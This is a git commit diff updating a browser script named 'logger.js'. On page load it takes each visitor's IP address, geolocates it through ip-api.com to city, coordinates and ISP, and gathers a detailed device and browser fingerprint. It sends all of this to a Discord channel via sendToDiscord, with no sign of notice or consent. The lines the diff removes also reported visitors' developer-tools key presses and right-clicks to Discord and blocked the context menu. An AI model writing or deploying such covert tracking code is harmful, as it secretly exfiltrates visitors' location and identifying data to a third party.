158ad7f81a7c0cb24607d8e0ef2dc76e74d112e5
Rishab <84559232+RISHAB-CREATOR@users.noreply.github.com>
2024-05-14 22:15:57 +0530

    Update logger.js

--- js/logger.js
+++ js/logger.js
@@ -29,82 +29,59 @@ window.addEventListener('load', () => {
         .then(response => response.json())
         .then(data => {
             const ip = data.YourFuckingIPAddress;
-            const hostname = data.YourFuckingHostname;
-            const country = data.YourFuckingCountry;
-            const region = data.YourFuckingRegion;
-            const city = data.YourFuckingCity;
-            const latitude = data.YourFuckingLatitude;
-            const longitude = data.YourFuckingLongitude;
-            const isp = data.YourFuckingISP;
-            const userAgent = navigator.userAgent;
-            const windowProperties = Object.keys(window).length;
-            const windowWidth = window.innerWidth;
-            const windowHeight = window.innerHeight;
-            const windowRatio = windowWidth / windowHeight;
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            const screenRatio = screenWidth / screenHeight;
-            const screenPixelRatio = window.devicePixelRatio;
-            const screenDPI = screen.pixelDepth;
-            const screenColorDepth = screen.colorDepth;
-            const screenOrientation = screen.orientation.type;
-            const screenRotation = screen.orientation.angle;
-            const os = navigator.platform;
-            const availableBrowserMemory = navigator.deviceMemory || 'Not available';
-            const cpuThreads = navigator.hardwareConcurrency || 'Not available';
+            fetch(`http://ip-api.com/json/${ip}`)
+                .then(response => response.json())
+                .then(ipData => {
+                    const country = ipData.country;
+                    const region = ipData.regionName;
+                    const city = ipData.city;
+                    const latitude = ipData.lat;
+                    const longitude = ipData.lon;
+                    const isp = ipData.isp;
+                    const userAgent = navigator.userAgent;
+                    const windowProperties = Object.keys(window);
+                    const windowWidth = window.innerWidth;
+                    const windowHeight = window.innerHeight;
+                    const windowRatio = windowWidth / windowHeight;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const screenRatio = screenWidth / screenHeight;
+                    const screenPixelRatio = window.devicePixelRatio;
+                    const screenDPI = screen.pixelDepth;
+                    const screenColorDepth = screen.colorDepth;
+                    const screenOrientation = screen.orientation.type;
+                    const screenRotation = screen.orientation.angle;
+                    const os = navigator.platform;
+                    const availableMemory = navigator.deviceMemory;
+                    const cpuThreads = navigator.hardwareConcurrency;
 
-            console.log('IP Address:', ip);
-            console.log('Hostname:', hostname);
-            console.log('Country:', country);
-            console.log('Region:', region);
-            console.log('City:', city);
-            console.log('Latitude:', latitude);
-            console.log('Longitude:', longitude);
-            console.log('ISP:', isp);
-            console.log('User Agent:', userAgent);
-            console.log('Window Properies:', windowProperties);
-            console.log('Window Width:', windowWidth);
-            console.log('Window Height:', windowHeight);
-            console.log('Window Ratio:', windowRatio);
-            console.log('Screen Width:', screenWidth);
-            console.log('Screen Height:', screenHeight);
-            console.log('Screen Ratio:', screenRatio);
-            console.log('Screen Pixel Ratio:', screenPixelRatio);
-            console.log('Screen DPI:', screenDPI);
-            console.log('Screen Color Depth:', screenColorDepth);
-            console.log('Screen Orientation:', screenOrientation);
-            console.log('Screen Rotation:', screenRotation);
-            console.log('OS:', os);
-            console.log('Available Browser Memory:', availableBrowserMemory);
-            console.log('CPU Threads:', cpuThreads);
+                    console.log('IP Address:', ip);
+                    console.log('Country:', country);
+                    console.log('Region:', region);
+                    console.log('City:', city);
+                    console.log('Latitude:', latitude);
+                    console.log('Longitude:', longitude);
+                    console.log('ISP:', isp);
+                    console.log('User Agent:', userAgent);
+                    console.log('Window Properties:', windowProperties);
+                    console.log('Window Width:', windowWidth);
+                    console.log('Window Height:', windowHeight);
+                    console.log('Window Ratio:', windowRatio);
+                    console.log('Screen Width:', screenWidth);
+                    console.log('Screen Height:', screenHeight);
+                    console.log('Screen Ratio:', screenRatio);
+                    console.log('Screen Pixel Ratio:', screenPixelRatio);
+                    console.log('Screen DPI:', screenDPI);
+                    console.log('Screen Color Depth:', screenColorDepth);
+                    console.log('Screen Orientation:', screenOrientation);
+                    console.log('Screen Rotation:', screenRotation);
+                    console.log('OS:', os);
+                    console.log('Available Browser Memory:', availableMemory);
+                    console.log('CPU Threads:', cpuThreads);
 
-            sendToDiscord(`IP Address: ${ip}\nHostname: ${hostname}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Properies: ${windowProperties}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableBrowserMemory}\nCPU Threads: ${cpuThreads}`);
-
-            // Add key event listener for Ctrl+Shift+J
-            document.addEventListener('keydown', function(event) {
-                const key = event.key;
-                const keyCombo = (event.ctrlKey ? 'Ctrl+' : '') + (event.shiftKey ? 'Shift+' : '') + key;
-                if (keyCombo === 'Ctrl+Shift+I' || keyCombo === 'Ctrl+Shift+i') {
-                    sendToDiscord('User pressed Ctrl+Shift+I to open console');
-                } else if (keyCombo === 'Ctrl+Shift+J' || keyCombo === 'Ctrl+Shift+j') {
-                    sendToDiscord('User pressed Ctrl+Shift+J to open element inspector');
-                } else if (keyCombo === 'Ctrl+Shift+C' || keyCombo === 'Ctrl+Shift+c') {
-                    sendToDiscord('User pressed Ctrl+Shift+C to open element inspector');
-                } else if (keyCombo === 'Ctrl+Shift+U' || keyCombo === 'Ctrl+Shift+u') {
-                    sendToDiscord('User pressed Ctrl+Shift+U to open element inspector');
-                } else if (keyCombo === 'Ctrl+U' || keyCombo === 'Ctrl+u') {
-                    sendToDiscord('User pressed Ctrl+U to open element inspector');
-                } else if (keyCombo === 'F12') {
-                    sendToDiscord('User pressed F12 to open element inspector');
-                }
-                // Add other key combinations as needed
-            });
-
-            // Add contextmenu event listener for right-click
-            document.addEventListener('contextmenu', function(event) {
-                sendToDiscord('User attempted to right-click');
-                event.preventDefault(); // Prevent the default right-click behavior
-            });
+                    sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Properties: ${windowProperties}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
+                })
+                .catch(error => console.error('Error getting IP details:', error));
         })
-        .catch(error => console.error('Error getting user details:', error));
+        .catch(error => console.error('Error getting IP address:', error));
 });
